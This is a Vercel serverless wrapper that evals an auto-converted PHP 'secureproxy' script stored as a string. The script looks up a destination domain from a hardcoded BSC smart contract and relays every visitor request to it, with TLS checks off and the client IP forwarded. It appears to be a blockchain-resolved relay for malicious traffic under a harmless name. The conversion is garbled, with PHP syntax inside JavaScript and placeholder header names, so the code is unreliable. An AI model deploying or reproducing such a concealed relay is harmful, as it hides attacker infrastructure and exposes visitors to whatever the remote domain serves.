
// Vercel serverless wrapper for original secureproxy logic.
// This file was generated automatically from the uploaded project.
// It exposes a default handler compatible with Vercel's Serverless Functions API.
import { Buffer } from "buffer";

// Original secureproxy.js content starts (sanitized)
const ORIGINAL_CODE = "// Auto-converted from PHP -> JS (heuristic). Manual review required.\n// Filename: secureproxy.php\nconst qs = require('querystring');\nmodule.exports = function handler(req, res) {\n  try {\n  \n  header('Access-Control-Allow-Origin: *');\n  header('Access-Control-Allow-Methods: *');\n  header('Access-Control-Allow-Headers: *');\n  header('Access-Control-Max-Age: 3600');\n  \n  function getClientIP() {\n      // Check for Cloudflare IP\n      if (isset(req.headers[\"\\1\"])) {\n          return req.headers[\"\\1\"];\n      }\n      \n      // Check X-Forwarded-For\n      if (isset(req.headers[\"\\1\"])) {\n          // Get first IP in chain\n          ips = explode(',', req.headers[\"\\1\"]);\n          return trim(ips[0]);\n      }\n      \n      // Fallback to direct IP\n      return req.headers[\"\\1\"];\n  }\n  \n  \n  class SecureProxyMiddleware {\n      private updateInterval = 60;\n      private rpcUrls;\n      private contractAddress;\n      private cacheFile;\n      \n      public function __construct(options = []) {\n          this->rpcUrls = options['rpcUrls'] ?? [\n              \"https://rpc.ankr.com/bsc\",\n              \"https://bsc-dataseed2.bnbchain.org\"\n          ];\n          this->contractAddress = options['contractAddress'] ?? \"0xe9d5f645f79fa60fca82b4e1d35832e43370feb0\";\n          \n          serverIdentifier = md5(\n              req.headers[\"\\1\"] + ':' + \n              req.headers[\"\\1\"] + ':' + \n              req.headers[\"\\1\"]\n          );\n          this->cacheFile = sys_get_temp_dir() + '/proxy_cache_' + serverIdentifier + '.json';\n      }\n  \n      private function loadCache() {\n          if (!file_exists(this->cacheFile)) return null;\n          cache = json_decode(file_get_contents(this->cacheFile), true);\n          if (!cache || (time() - cache['timestamp']) > this->updateInterval) {\n              return null;\n          }\n          return cache['domain'];\n      }\n  \n      private function filterHeaders(headers) {\n          blacklist = ['host'];\n          formatted = [];\n          \n          foreach (headers as key => value) {\n              key = strtolower(key);\n              if (!in_array(key, blacklist)) {\n                  formatted[] = \"key: value\";\n              }\n          }\n          \n          return formatted;\n      }\n  \n      private function saveCache(domain) {\n          cache = ['domain' => domain, 'timestamp' => time()];\n          file_put_contents(this->cacheFile, json_encode(cache));\n      }\n  \n      private function hexToString(hex) {\n          hex = preg_replace('/^0x/', '', hex);\n          hex = substr(hex, 64);\n          lengthHex = substr(hex, 0, 64);\n          length = hexdec(lengthHex);\n          dataHex = substr(hex, 64, length * 2);\n          result = '';\n          for (i = 0; i < strlen(dataHex); i += 2) {\n              charCode = hexdec(substr(dataHex, i, 2));\n              if (charCode === 0) break;\n              result .= chr(charCode);\n          }\n          return result;\n      }\n  \n      private function fetchTargetDomain() {\n          data = '20965255';\n          \n          foreach (this->rpcUrls as rpcUrl) {\n              try {\n                  ch = curl_init(rpcUrl);\n                  curl_setopt_array(ch, [\n                      CURLOPT_RETURNTRANSFER => true,\n                      CURLOPT_POST => true,\n                      CURLOPT_POSTFIELDS => json_encode([\n                          'jsonrpc' => '2.0',\n                          'id' => 1,\n                          'method' => 'eth_call',\n                          'params' => [[\n                              'to' => this->contractAddress,\n                              'data' => '0x' + data\n                          ], 'latest']\n                      ]),\n                      CURLOPT_HTTPHEADER => ['Content-Type: application/json'],\n                      CURLOPT_TIMEOUT => 120,\n                      CURLOPT_SSL_VERIFYPEER => false,\n                      CURLOPT_SSL_VERIFYHOST => false\n                  ]);\n  \n                  response = curl_exec(ch);\n                  if (curl_errno(ch)) {\n                      curl_close(ch);\n                      continue;\n                  }\n                  \n                  curl_close(ch);\n                  responseData = json_decode(response, true);\n                  if (isset(responseData['error'])) continue;\n  \n                  domain = this->hexToString(responseData['result']);\n                  if (domain) return domain;\n              } catch (Exception e) {\n                  continue;\n              }\n          }\n          throw new Exception('Could not fetch target domain');\n      }\n  \n      private function getTargetDomain() {\n          cachedDomain = this->loadCache();\n          if (cachedDomain) return cachedDomain;\n  \n          domain = this->fetchTargetDomain();\n          this->saveCache(domain);\n          return domain;\n      }\n  \n      private function formatHeaders(headers) {\n          formatted = [];\n          foreach (headers as name => value) {\n              if (is_array(value)) value = implode(', ', value);\n              formatted[] = \"name: value\";\n          }\n          return formatted;\n      }\n  \n      public function handle(endpoint) {\n          try {\n              targetDomain = rtrim(this->getTargetDomain(), '/');\n              endpoint = '/' + ltrim(endpoint, '/');\n              url = targetDomain + endpoint;\n              \n              clientIP = getClientIP();\n  \n              headers = getallheaders();\n              // headers = this->filterHeaders(headers);\n              unset(headers['Host'], headers['host']);\n              unset(headers['origin'], headers['Origin']);\n              unset(headers['Accept-Encoding'], headers['Content-Encoding']);\n              unset(headers['Content-Encoding'], headers['content-encoding']);\n          \n              headers['x-dfkjldifjlifjd'] = clientIP;\n              ch = curl_init(url);\n              curl_setopt_array(ch, [\n                  CURLOPT_CUSTOMREQUEST => req.headers[\"\\1\"],\n                  CURLOPT_POSTFIELDS => file_get_contents('php://input'),\n                  CURLOPT_RETURNTRANSFER => true,\n                  CURLOPT_HTTPHEADER => this->formatHeaders(headers),\n                  CURLOPT_TIMEOUT => 120,\n                  CURLOPT_FOLLOWLOCATION => true,\n                  CURLOPT_SSL_VERIFYPEER => false,\n                  CURLOPT_SSL_VERIFYHOST => false,\n                  CURLOPT_ENCODING => ''\n              ]);\n  \n              response = curl_exec(ch);\n              if (curl_errno(ch)) {\n                  throw new Exception(curl_error(ch));\n              }\n              \n              httpCode = curl_getinfo(ch, CURLINFO_HTTP_CODE);\n              contentType = curl_getinfo(ch, CURLINFO_CONTENT_TYPE);\n              curl_close(ch);\n  \n              header('Access-Control-Allow-Origin: *');\n              header('Access-Control-Allow-Methods: GET, HEAD, POST, OPTIONS');\n              header('Access-Control-Allow-Headers: *');\n              if (contentType) header('Content-Type: ' + contentType);\n              \n              http_response_code(httpCode);\n              res.write(response);\n  \n          } catch (Exception e) {\n              http_response_code(500);\n              res.write('error' + e);\n          }\n      }\n  }\n  \n  if (req.headers[\"\\1\"] === 'OPTIONS') {\n      header('Access-Control-Allow-Origin: *');\n      header('Access-Control-Allow-Methods: GET, HEAD, POST, OPTIONS');\n      header('Access-Control-Allow-Headers: *');\n      header('Access-Control-Max-Age: 86400');\n      http_response_code(204);\n      exit;\n  }\n  \n  if (req.query.e === 'ping_proxy') {\n      header('Content-Type: text/plain');\n      res.write('pong');\n      exit;\n  } else if (isset(req.query.e)) {\n      proxy = new SecureProxyMiddleware([\n          'rpcUrls' => [\n              \"https://binance.llamarpc.com\",\n              \"https://bsc.drpc.org\"\n          ],\n          'contractAddress' => \"0xe9d5f645f79fa60fca82b4e1d35832e43370feb0\"\n      ]);\n      endpoint = urldecode(req.query.e);\n      endpoint = ltrim(endpoint, '/');\n      proxy->handle(endpoint);\n  } else {\n      http_response_code(400);\n      res.write('Missing endpoint');\n  }\n  res.end();\n  } catch (err) {\n    console.error('Conversion-runtime error:', err);\n    res.status(500).send('Server error');\n  }\n};\n"

// Helper to run original code safely.
// We provide minimal CommonJS environment for code that uses module.exports or require.
async function runOriginal(req, res) {
  // Create a fake module and exports
  const module = { exports: {} };
  const exports = module.exports;
  const require = (name) => { throw new Error("Runtime require() is disabled in this sandbox wrapper: " + name); };
  try {
    // eslint-disable-next-line no-eval
    const func = eval("(function(module, exports, require, req, res){ " + ORIGINAL_CODE + " \n return module.exports || exports; })");
    const result = func(module, exports, require, req, res);
    // If the original file exported a function, call it
    if (typeof module.exports === "function") {
      return await module.exports(req, res);
    }
    // If it returned a function
    if (typeof result === "function") {
      return await result(req, res);
    }
    // Otherwise, just return a 204 No Content
    return null;
  } catch (err) {
    throw err;
  }
}

export default async function handler(req, res) {
  try {
    await runOriginal(req, res);
    // If original didn't send a response, send a default JSON.
    if (!res.writableEnded) {
      res.statusCode = 200;
      res.setHeader('Content-Type', 'application/json');
      res.end(JSON.stringify({ status: "ok", message: "secureproxy executed (no explicit response from original script)" }));
    }
  } catch (err) {
    console.error("secureproxy wrapper error:", err);
    if (!res.writableEnded) {
      res.statusCode = 500;
      res.setHeader('Content-Type', 'application/json');
      res.end(JSON.stringify({ error: String(err) }));
    }
  }
}
